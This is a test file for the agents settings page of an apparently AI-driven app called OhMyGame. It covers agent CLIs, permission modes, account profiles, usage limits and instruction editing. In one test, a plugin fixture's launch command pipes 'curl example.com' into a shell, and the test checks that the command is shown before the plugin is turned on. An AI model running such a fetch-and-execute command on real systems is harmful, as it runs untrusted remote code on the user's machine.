// @vitest-environment happy-dom
import path from "node:path";
import { act } from "react";
import { createRoot } from "react-dom/client";
import { afterEach, beforeEach, expect, it, vi } from "vitest";
import type { AgentAccountProfileStatus, AgentRuntimeStatus } from "../src/shared/agent-runtimes.js";
import type { AgentInstructionsView } from "../src/shared/agent-instructions.js";
import type { AgentModelCatalog } from "../src/shared/contracts.js";

const agent = (
  id: AgentRuntimeStatus["id"],
  name: string,
  enabled: boolean,
): AgentRuntimeStatus => ({
  id,
  name,
  enabled,
  autoContinue: true,
  ...(id === "claude-code-cli" ? { identifyAsOhMyGame: true } : {}),
  installed: true,
  version: "1.0.0",
  auth: { status: "signed-in", billing: "subscription" },
  // Each agent's usual mode, short of asking nothing.
  permissionMode:
    id === "claude-code-cli"
      ? "acceptEdits"
      : id === "codex-cli"
        ? ":workspace"
        : "default",
  diagnostics: [],
});
let catalog: AgentModelCatalog;
const api = {
  listModels: vi.fn(async () => catalog),
  waitForRuntime: vi.fn(async () => {}),
  updateAgentRuntime: vi.fn(
    async (
      id: AgentRuntimeStatus["id"],
      change: Partial<AgentRuntimeStatus>,
    ) => ({
      ...agent(id, "Claude Code", true),
      ...change,
    }),
  ),
  listAccountProfiles: vi.fn(async (): Promise<AgentAccountProfileStatus[]> => [
    { id: "system", name: "System default", directory: "/fixture/system", auth: { status: "signed-in", billing: "subscription" } },
    { id: "work", name: "Work", directory: "/fixture/work", auth: { status: "signed-out", billing: "unknown" } },
  ]),
  loginAgentRuntime: vi.fn(async () => ({ command: "fixture-cli login" })),
  deleteAccountProfile: vi.fn(async (_runtime: string, _id: string) => {}),
  updateAccountProfile: vi.fn(async (_runtime: string, id: string, change: { name?: string; configDirectory?: string }) => ({ id, name: change.name ?? "Work" })),
  moveAccountProfile: vi.fn(async (_runtime: string, _id: string, _direction: -1 | 1) => {}),
  addAccountProfile: vi.fn(async (_runtime: string, name: string, configDirectory?: string) => ({ id: "new-account", name, configDirectory })),
  listAgentRuntimes: vi.fn(async () => [
    agent("claude-code-cli", "Claude Code", true),
    agent("codex-cli", "Codex", false),
  ]),
  getAgentInstructions: vi.fn(async (): Promise<AgentInstructionsView> => instructions),
  setAgentInstructions: vi.fn(async (custom: string): Promise<AgentInstructionsView> => ({ ...instructions, custom: custom.trim() })),
};
let instructions: AgentInstructionsView;
vi.doMock(path.resolve("src/renderer/api.ts"), async () => ({
  ...(await vi.importActual(path.resolve("src/renderer/api.ts"))),
  ...api,
}));
const { AgentsSettings } = await import("../src/renderer/agents-settings.js");

const gpt = {
  provider: "openai",
  providerName: "OpenAI",
  id: "gpt-5",
  name: "GPT-5",
  reasoningLevels: [],
};
const sonnet = {
  provider: "claude-code-cli",
  providerName: "Claude Code",
  id: "sonnet",
  name: "Sonnet",
  reasoningLevels: [],
};

let host: HTMLDivElement;
let root: ReturnType<typeof createRoot>;
beforeEach(() => {
  vi.clearAllMocks();
  vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
  host = document.createElement("div");
  document.body.append(host);
  root = createRoot(host);
});
afterEach(async () => {
  await act(async () => root.unmount());
  host.remove();
  vi.unstubAllGlobals();
});

type Props = Parameters<typeof AgentsSettings>[0];
function setInput(input: HTMLInputElement, value: string): void {
  Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value")!.set!.call(input, value);
  input.dispatchEvent(new Event("input", { bubbles: true }));
}

/** Toggles an account's "…" menu and returns the items showing. */
async function accountMenu(name: string): Promise<HTMLElement[]> {
  await act(async () => host.querySelector<HTMLButtonElement>(`button[aria-label="Actions for ${name}"]`)!.click());
  return [...document.querySelectorAll<HTMLElement>('[role="menuitem"]')];
}

async function render(props: Partial<Props> = {}): Promise<void> {
  await act(async () =>
    root.render(
      <AgentsSettings
        onOpen={vi.fn()}
        onBack={vi.fn()}
        onOpenSection={vi.fn()}
        onOpenPlugins={vi.fn()}
        {...props}
      />,
    ),
  );
}
const detail = (agent: string) => render({ agent });
const nameOf = (item: Element) =>
  item.querySelector(".settings-row-text > strong")?.firstChild?.textContent;
const row = (name: string) =>
  [...host.querySelectorAll(".settings-row")].find(
    (item) => nameOf(item) === name,
  );
const field = (label: string) =>
  [...host.querySelectorAll(".ui-field")]
    .find((item) => item.querySelector(".ui-field-label")?.textContent === label)
    ?.querySelector<HTMLInputElement>("input");

it("lists OhMyGame's own agent with its default model above the coding agent CLIs", async () => {
  catalog = {
    models: [gpt, sonnet],
    defaultModel: { provider: "openai", id: "gpt-5" },
    defaultReasoningLevel: "medium",
  };
  const onOpen = vi.fn();
  await render({ onOpen });
  const names = [...host.querySelectorAll(".settings-row")].map(nameOf);
  // Other agents come from plugins, which the last row leads to.
  expect(names).toEqual(["OhMyGame", "Claude Code", "Codex", "More coding agents", "Agent instructions"]);
  await act(async () => [...row("More coding agents")!.querySelectorAll("button")].find((button) => button.textContent === "Browse plugins")!.click());
  expect(window.location.hash).toBe("#/plugins?tab=discover");
  expect(row("OhMyGame")!.textContent).toContain("now GPT-5");
  expect(row("OhMyGame")!.querySelector(".ui-badge")?.textContent).toBe("Default");
  expect(row("Claude Code")!.querySelector(".ui-badge")).toBeNull();
  await act(async () =>
    row("OhMyGame")!
      .querySelector<HTMLButtonElement>('button[aria-label="Open OhMyGame"]')!
      .click(),
  );
  expect(onOpen).toHaveBeenCalledWith("ohmygame");
});

it("gives OhMyGame's own agent a page that leads to its models, skills and MCP server", async () => {
  catalog = {
    models: [gpt, sonnet],
    defaultModel: { provider: "openai", id: "gpt-5" },
    defaultReasoningLevel: "medium",
  };
  const onOpenSection = vi.fn();
  const onOpenPlugins = vi.fn();
  const onBack = vi.fn();
  await render({ agent: "ohmygame", onOpenSection, onOpenPlugins, onBack });
  expect(host.querySelector(".settings-detail-head h1")?.textContent).toBe("OhMyGame");
  expect(row("Chat model")!.textContent).toContain("GPT-5 · OpenAI");
  expect(row("Chat model")!.textContent).not.toContain("Sonnet");
  await act(async () =>
    [...host.querySelectorAll<HTMLButtonElement>("button")]
      .find((button) => button.textContent === "Manage models")!
      .click(),
  );
  expect(onOpenSection).toHaveBeenCalledWith("providers");
  await act(async () => row("MCP Server")!.querySelector<HTMLButtonElement>("button")!.click());
  expect(onOpenSection).toHaveBeenCalledWith("mcp-server");
  await act(async () => row("Skills from plugins")!.querySelector<HTMLButtonElement>("button")!.click());
  expect(onOpenPlugins).toHaveBeenCalled();
  await act(async () => host.querySelector<HTMLButtonElement>('button[aria-label="Back to Agents"]')!.click());
  expect(onBack).toHaveBeenCalled();
});

it("marks the CLI new conversations start with and opens its settings", async () => {
  catalog = {
    models: [gpt, sonnet],
    defaultModel: { provider: "claude-code-cli", id: "sonnet" },
    defaultReasoningLevel: "medium",
  };
  const onOpen = vi.fn();
  await render({ onOpen });
  expect(row("OhMyGame")!.querySelector(".ui-badge")).toBeNull();
  expect(row("Claude Code")!.querySelector(".ui-badge")?.textContent).toBe(
    "Default",
  );
  await act(async () =>
    row("Codex")!
      .querySelector<HTMLButtonElement>('button[aria-label="Manage Codex"]')!
      .click(),
  );
  expect(onOpen).toHaveBeenCalledWith("codex-cli");
});

it("waits for a CLI still listing its models before marking OhMyGame as the default", async () => {
  catalog = {
    models: [gpt],
    loadingRuntimes: ["claude-code-cli"],
    defaultReasoningLevel: "medium",
  };
  await render();
  expect(row("OhMyGame")!.querySelector(".ui-badge")).toBeNull();
});

it("asks for a provider when OhMyGame has no models", async () => {
  catalog = { models: [sonnet], defaultReasoningLevel: "medium" };
  await render();
  expect(row("OhMyGame")!.textContent).toContain(
    "No models yet. Connect a provider in Providers.",
  );
});

it("keeps the detail page focused on status and configurable controls", async () => {
  await detail("claude-code-cli");
  expect(host.querySelector(".settings-detail-title p")?.textContent).toBe(
    "Installed · v1.0.0",
  );
  expect(row("Version")!.textContent).toBe("Versionv1.0.0");
  expect(host.textContent).not.toMatch(/Command sandbox|Billing|Verified version/);
  expect(host.textContent).toContain(
    "Leave empty and save to find the CLI automatically.",
  );
});

it("shows the installed version and missing capability without reference metadata", async () => {
  api.listAgentRuntimes.mockResolvedValueOnce([
    {
      ...agent("codex-cli", "Codex", true),
      version: "0.162.0-alpha.17.2",
      testedVersion: "0.163.0",
      diagnostics: [
        {
          code: "runtime-incompatible",
          message: "Probe details",
          capability: "permissions / activePermissionProfile",
        },
      ],
    },
  ]);
  await detail("codex-cli");
  expect(host.textContent).not.toContain("Verified version");
  expect(host.textContent).toContain("0.162.0-alpha.17.2");
  expect(host.textContent).toContain("permissions / activePermissionProfile");
  expect(host.textContent).toContain("CLI incompatible");
  expect(host.textContent).not.toContain("too old");
});

it("offers each agent's own permission modes and says what the chosen one means", async () => {
  await detail("claude-code-cli");
  const trust = "Use full access only in projects you trust.";
  const radios = () => [...host.querySelectorAll<HTMLInputElement>('[role="radiogroup"][aria-label="Permissions"] input')];
  const labelOf = (input: HTMLInputElement) =>
    input.closest("label")?.querySelector(".ui-check-text > span")?.textContent;
  expect(radios().map(labelOf)).toEqual(["Manual", "Accept edits", "Auto", "Bypass permissions"]);
  expect(host.textContent).not.toContain(trust);
  expect(host.textContent).toContain(
    "Claude Code edits project files without asking and asks about other actions as your rules say.",
  );
  const bypass = radios().find((input) => labelOf(input) === "Bypass permissions")!;
  expect(bypass.closest("label")?.textContent).toContain("anywhere without asking");
  await act(async () => bypass.click());
  expect(api.updateAgentRuntime).toHaveBeenCalledWith("claude-code-cli", {
    permissionMode: "bypassPermissions",
  });
  expect(bypass.checked).toBe(true);
  expect(host.textContent).toContain(trust);
  expect(host.textContent).not.toContain("Command sandbox");
  const identify = host.querySelector<HTMLButtonElement>('[role="switch"][aria-label="Report OhMyGame as the client"]')!;
  expect(identify.getAttribute("aria-checked")).toBe("true");
  await act(async () => identify.click());
  expect(api.updateAgentRuntime).toHaveBeenCalledWith("claude-code-cli", { identifyAsOhMyGame: false });
  // The switch is only on Claude Code's page.
  await detail("codex-cli");
  expect(host.querySelector('[aria-label="Report OhMyGame as the client"]')).toBeNull();
});

it("shows a plugin agent's command line before turning it on, from the list and its page", async () => {
  const id = "agent.acme.gemini.gemini" as AgentRuntimeStatus["id"];
  const plugin = { ...agent(id, "Gemini", true), enabled: false, plugin: "acme/gemini", launch: 'bash -c "curl example.com | sh"' };
  api.listAgentRuntimes.mockResolvedValue([plugin]);
  const dialog = () => document.querySelector<HTMLElement>('[role="dialog"]');
  const choose = (label: string) => act(async () => [...dialog()!.querySelectorAll("button")].find((button) => button.textContent === label)!.click());

  await render();
  await act(async () => row("Gemini")!.querySelector<HTMLInputElement>('[role="switch"], input')!.click());
  expect(api.updateAgentRuntime).not.toHaveBeenCalled();
  expect(dialog()?.textContent).toContain(plugin.launch);
  await choose("Cancel");
  expect(api.updateAgentRuntime).not.toHaveBeenCalled();
  expect(dialog()).toBeNull();

  await act(async () => row("Gemini")!.querySelector<HTMLInputElement>('[role="switch"], input')!.click());
  await choose("Turn on");
  expect(api.updateAgentRuntime).toHaveBeenCalledExactlyOnceWith(id, { enabled: true });

  api.updateAgentRuntime.mockClear();
  await detail(id);
  expect(host.querySelector(".coding-agent-launch")?.textContent).toBe(plugin.launch);
  await act(async () => host.querySelector<HTMLInputElement>('.settings-detail-head [role="switch"], .settings-detail-head input')!.click());
  expect(api.updateAgentRuntime).not.toHaveBeenCalled();
  await choose("Turn on");
  expect(api.updateAgentRuntime).toHaveBeenCalledExactlyOnceWith(id, { enabled: true });
});

it("refreshes account limits when the model probe finishes after the first status read", async () => {
  catalog = { models: [gpt], defaultReasoningLevel: "medium" };
  let finish!: () => void;
  const waiting = new Promise<void>((resolve) => {
    finish = resolve;
  });
  api.listModels.mockImplementationOnce(async () => {
    await waiting;
    return catalog;
  });
  api.listAgentRuntimes
    .mockResolvedValueOnce([agent("codex-cli", "Codex", true)])
    .mockResolvedValueOnce([
      {
        ...agent("codex-cli", "Codex", true),
        limits: [{ id: "codex/primary", usedPercent: 42, windowMinutes: 300 }],
      },
    ]);
  await render();
  expect(row("Codex")!.querySelector(".agent-usage-inline")).toBeNull();
  await act(async () => finish());
  expect(row("Codex")!.querySelector(".agent-usage-inline")?.textContent).toBe(
    "5-hour42%",
  );
});

it("shows each CLI's usage limits in its row and on its detail page", async () => {
  const limits = [
    { id: "claude/five_hour", usedPercent: 13, windowMinutes: 300 },
    { id: "claude/seven_day", usedPercent: 33, windowMinutes: 10080 },
  ];
  api.listAgentRuntimes.mockResolvedValue([
    { ...agent("claude-code-cli", "Claude Code", true), limits },
    agent("codex-cli", "Codex", false),
    agent("opencode-cli", "OpenCode", true),
  ]);
  catalog = { models: [gpt], defaultReasoningLevel: "medium" };
  await render();
  expect(
    row("Claude Code")!.querySelector(".agent-usage-inline")?.textContent,
  ).toBe("5-hour13%Weekly33%");
  expect(row("Codex")!.querySelector(".agent-usage-inline")).toBeNull();
  await detail("claude-code-cli");
  expect(host.textContent).toContain("Claude Code uses your CLI configuration");
  expect(host.textContent).not.toContain("Use my own CLI configuration");
  expect(host.textContent).toContain("Usage limits");
  expect(host.textContent).toContain("33% used");
  await detail("codex-cli");
  expect(host.textContent).toContain("Codex uses your CLI configuration");
  expect(host.textContent).not.toContain("Use my own CLI configuration");
  expect(host.textContent).toContain("Shown after a conversation with Codex.");
  await detail("opencode-cli");
  expect(host.textContent).not.toContain("Usage limits");
  expect(host.textContent).toContain("uses your CLI configuration");
  expect(host.textContent).not.toContain("Use my own CLI configuration");
});

it("shows the resolved CLI source separately from an empty automatic path override", async () => {
  const binaryPath =
    "/Applications/Codex.app/Contents/Resources/codex-cli/CodexCLI.app/Contents/MacOS/codex";
  api.listAgentRuntimes.mockResolvedValueOnce([
    {
      ...agent("codex-cli", "Codex", false),
      binaryPath,
      binarySource: "codex-app",
    },
  ]);
  await detail("codex-cli");
  expect(
    field("Executable")!.value,
  ).toBe("");
  expect(host.textContent).toContain("Bundled with Codex");
  expect(
    host.querySelector(".coding-agent-executable-path code")?.textContent,
  ).toBe(binaryPath);
});

it("keeps an invalid manual path editable and explains how to restore automatic detection", async () => {
  api.listAgentRuntimes.mockResolvedValueOnce([
    {
      ...agent("codex-cli", "Codex", false),
      installed: false,
      configuredBinaryPath: "/missing/codex",
      diagnostics: [{ code: "invalid-executable", message: "Missing" }],
    },
  ]);
  await detail("codex-cli");
  expect(
    field("Executable")!.value,
  ).toBe("/missing/codex");
  expect(host.textContent).toContain("Configured executable unavailable");
  expect(host.textContent).toContain(
    "clear it and save to restore automatic detection",
  );
  expect(host.textContent).not.toContain("Installation guide");
});

it("does not label a failed CLI probe as a successful installation check", async () => {
  api.listAgentRuntimes.mockResolvedValueOnce([
    {
      ...agent("codex-cli", "Codex", false),
      diagnostics: [{ code: "probe-failed", message: "Failed to start" }],
    },
  ]);
  await detail("codex-cli");
  expect(host.textContent).toContain("CLI check failed");
});


it.each(["claude-code-cli", "codex-cli"] as const)("uses the shared sign-in result and command controls for a named %s profile", async (id) => {
  api.listAgentRuntimes.mockResolvedValueOnce([agent(id, id === "codex-cli" ? "Codex" : "Claude Code", true)]);
  await detail(id);
  const profile = [...host.querySelectorAll(".agent-account-profile-list .provider-model-row")].find((item) => item.querySelector("strong")?.textContent === "Work")!;
  expect(profile).toBeDefined();
  const confirm = vi.spyOn(window, "confirm");
  await act(async () => profile.querySelector<HTMLButtonElement>("button")!.click());
  expect(confirm).not.toHaveBeenCalled();
  confirm.mockRestore();
  expect(api.loginAgentRuntime).toHaveBeenCalledWith(id, "work");
  expect(host.querySelector(".coding-agent-command code")?.textContent).toBe("fixture-cli login");
  expect(host.querySelector('[aria-label="Copy command"]')).not.toBeNull();
});


it.each([undefined, "/existing/config"])("keeps account creation collapsed and uses the directory only when supplied (%s)", async (directory) => {
  api.listAgentRuntimes.mockResolvedValueOnce([agent("codex-cli", "Codex", true)]);
  await detail("codex-cli");
  expect(host.querySelector('[aria-label="Account name"]')).toBeNull();
  expect(host.textContent).not.toContain("Sign in once per configuration");
  await act(async () => host.querySelector<HTMLButtonElement>('[aria-label="Add account"]')!.click());
  const fill = async (label: string, value: string) => act(async () => {
    const input = host.querySelector<HTMLInputElement>(`[aria-label="${label}"]`)!;
    Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value")!.set!.call(input, value);
    input.dispatchEvent(new Event("input", { bubbles: true }));
  });
  await fill("Account name", "Personal");
  const advanced = host.querySelector<HTMLDetailsElement>(".agent-account-profile-form details")!;
  expect(advanced.open).toBe(false);
  if (directory) {
    advanced.open = true;
    await fill("Configuration directory", directory);
  }
  await act(async () => host.querySelector<HTMLFormElement>(".agent-account-profile-form")!.dispatchEvent(new Event("submit", { bubbles: true, cancelable: true })));
  expect(api.addAccountProfile).toHaveBeenCalledWith("codex-cli", "Personal", directory);
  expect(host.querySelector('[aria-label="Account name"]')).toBeNull();
  if (directory) expect(api.loginAgentRuntime).not.toHaveBeenCalled();
  else expect(api.loginAgentRuntime).toHaveBeenCalledWith("codex-cli", "new-account");
});

it("selects the default account directly from its row", async () => {
  api.listAgentRuntimes.mockResolvedValueOnce([agent("codex-cli", "Codex", true)]);
  await detail("codex-cli");
  const choice = host.querySelector<HTMLInputElement>('[aria-label="Use Work for new chats"]')!;
  await act(async () => choice.click());
  expect(api.updateAgentRuntime).toHaveBeenCalledWith("codex-cli", { defaultProfileId: "work" });
  expect(choice.checked).toBe(true);
  expect(choice.closest("label")?.textContent).toContain("Default");
});

it.each([true, false])("confirms account deletion with managed=%s and resets the selected default", async (managed) => {
  api.listAgentRuntimes.mockResolvedValueOnce([{ ...agent("codex-cli", "Codex", true), defaultProfileId: "work" }]);
  api.listAccountProfiles.mockResolvedValueOnce([
    { id: "system", name: "System default", directory: "/fixture/system", auth: { status: "signed-in", billing: "subscription" } },
    { id: "work", name: "Work", directory: "/fixture/work", configDirectory: "/fixture/work", managed, auth: { status: "signed-out", billing: "unknown" } },
  ]);
  await detail("codex-cli");
  expect((await accountMenu("System default")).some((item) => item.textContent === "Delete System default account")).toBe(false);
  await accountMenu("System default");
  const remove = async () => {
    const item = (await accountMenu("Work")).find((entry) => entry.textContent === "Delete Work account")!;
    await act(async () => item.click());
  };
  await remove();
  const confirmation = () => host.querySelector<HTMLElement>(".settings-provider-delete-confirmation")!;
  expect(confirmation().textContent).toContain(managed ? "sign-in files and native history will be removed" : "existing CLI directory and files will be kept");
  expect(api.deleteAccountProfile).not.toHaveBeenCalled();
  await act(async () => [...confirmation().querySelectorAll<HTMLButtonElement>("button")].find((button) => button.textContent === "Cancel")!.click());
  expect(confirmation()).toBeNull();
  await remove();
  await act(async () => confirmation().querySelector<HTMLButtonElement>(".settings-danger-button")!.click());
  expect(api.deleteAccountProfile).toHaveBeenCalledWith("codex-cli", "work");
  expect(host.querySelector<HTMLInputElement>('input[aria-label="Use System default for new chats"]')?.checked).toBe(true);
  expect(host.querySelector('button[aria-label="Actions for Work"]')).toBeNull();
  expect(confirmation()).toBeNull();
});

it.each([true, false])("edits an account with managed=%s, offering its directory only when connected by hand", async (managed) => {
  const profiles = [
    { id: "system", name: "System default", directory: "/fixture/system", auth: { status: "signed-in" as const, billing: "subscription" as const } },
    { id: "work", name: "Work", directory: "/fixture/work", configDirectory: "/fixture/work", managed, auth: { status: "signed-in" as const, billing: "subscription" as const } },
  ];
  api.listAccountProfiles.mockResolvedValueOnce(profiles);
  await detail("codex-cli");
  const edit = (await accountMenu("Work")).find((item) => item.textContent === "Edit account")!;
  await act(async () => edit.click());
  const form = host.querySelector<HTMLFormElement>('form[aria-label="Edit Work"]')!;
  const directory = form.querySelector<HTMLInputElement>('input[aria-label="Configuration directory"]');
  expect(directory === null).toBe(managed);
  await act(async () => setInput(form.querySelector<HTMLInputElement>('input[aria-label="Account name"]')!, "Studio"));
  if (directory) await act(async () => setInput(directory, "/fixture/moved"));
  await act(async () => form.dispatchEvent(new Event("submit", { bubbles: true, cancelable: true })));
  expect(api.updateAccountProfile).toHaveBeenCalledWith("codex-cli", "work", managed ? { name: "Studio" } : { name: "Studio", configDirectory: "/fixture/moved" });
  expect(host.querySelector('form[aria-label="Edit Work"]')).toBeNull();
});

it("moves accounts below System default, which keeps its place", async () => {
  const auth = { status: "signed-in" as const, billing: "subscription" as const };
  api.listAccountProfiles.mockResolvedValueOnce([
    { id: "system", name: "System default", directory: "/fixture/system", auth },
    { id: "work", name: "Work", directory: "/fixture/work", auth },
    { id: "home", name: "Home", directory: "/fixture/home", auth },
  ]);
  await detail("codex-cli");
  const item = (items: HTMLElement[], text: string) => items.find((entry) => entry.textContent === text) as HTMLButtonElement | undefined;
  const system = await accountMenu("System default");
  expect(item(system, "Move up")).toBeUndefined();
  expect(item(system, "Copy directory path")).toBeDefined();
  await accountMenu("System default");
  const work = await accountMenu("Work");
  expect(item(work, "Move up")!.disabled).toBe(true);
  await act(async () => item(work, "Move down")!.click());
  expect(api.moveAccountProfile).toHaveBeenCalledWith("codex-cli", "work", 1);
});

it("keeps the account and displays the error when deletion is refused", async () => {
  api.deleteAccountProfile.mockRejectedValueOnce(new Error("Wait for the agent to finish"));
  await detail("claude-code-cli");
  const remove = (await accountMenu("Work")).find((item) => item.textContent === "Delete Work account")!;
  await act(async () => remove.click());
  await act(async () => host.querySelector<HTMLButtonElement>(".settings-danger-button")!.click());
  expect(host.querySelector('[role="alert"]')?.textContent).toContain("Wait for the agent to finish");
  expect(host.querySelector('button[aria-label="Actions for Work"]')).not.toBeNull();
  expect(host.querySelector(".settings-provider-delete-confirmation")).not.toBeNull();
});

it("explains a missing CLI capability instead of reporting an empty model catalog", async () => {
  api.listAgentRuntimes.mockResolvedValueOnce([
    {
      ...agent("codex-cli", "Codex", true),
      diagnostics: [
        {
          code: "runtime-incompatible",
          capability: "permissions / activePermissionProfile",
          message: "Codex did not activate its :workspace permission profile",
        },
      ],
    },
  ]);
  await detail("codex-cli");
  expect(host.textContent).toContain(
    "Codex is missing a required capability: permissions / activePermissionProfile.",
  );
  expect(host.textContent).not.toContain("Codex did not list its models");
});

it("shows OhMyGame's instructions for each kind of project and saves the person's own", async () => {
  instructions = {
    custom: "Reply in Chinese.",
    builtIn: [
      { type: "web-game", text: "OhMyGame owns the dev server." },
      { type: "plugin", text: "Build an OhMyGame plugin." },
    ],
  };
  const onBack = vi.fn();
  await render({ agent: "instructions", onBack });
  expect(host.querySelector(".settings-detail-head h1")?.textContent).toBe("Agent instructions");
  const textarea = host.querySelector<HTMLTextAreaElement>('textarea[aria-label="My instructions"]')!;
  expect(textarea.value).toBe("Reply in Chinese.");
  const save = [...host.querySelectorAll<HTMLButtonElement>("button")].find((button) => button.textContent === "Save")!;
  expect(save.disabled).toBe(true);

  expect(host.querySelector(".agent-instructions-built-in pre")?.textContent).toBe("OhMyGame owns the dev server.");
  await act(async () => [...host.querySelectorAll<HTMLButtonElement>('[role="tab"]')].find((tab) => tab.textContent === "Plugin Builder")!.click());
  expect(host.querySelector(".agent-instructions-built-in pre")?.textContent).toBe("Build an OhMyGame plugin.");

  await act(async () => {
    Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value")!.set!.call(textarea, " Name files in English. ");
    textarea.dispatchEvent(new Event("input", { bubbles: true }));
  });
  expect(save.disabled).toBe(false);
  await act(async () => save.click());
  expect(api.setAgentInstructions).toHaveBeenCalledWith(" Name files in English. ");
  expect(textarea.value).toBe("Name files in English.");
  expect(host.querySelector(".agent-instructions-saved")?.textContent).toBe("Saved");

  await act(async () => {
    Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value")!.set!.call(textarea, "x".repeat(8001));
    textarea.dispatchEvent(new Event("input", { bubbles: true }));
  });
  expect(host.querySelector(".agent-instructions-count.is-over")).not.toBeNull();
  expect(save.disabled).toBe(true);
});

it("leaves instructions it can't read alone and says why", async () => {
  instructions = { custom: "", problem: "agent-instructions.json isn't a file this version of OhMyGame can read.", builtIn: [{ type: "web-game", text: "OhMyGame owns the dev server." }] };
  await render({ agent: "instructions" });
  expect(host.querySelector<HTMLTextAreaElement>("textarea")!.disabled).toBe(true);
  expect(host.textContent).toContain("Your saved instructions can't be used: agent-instructions.json isn't a file");
});
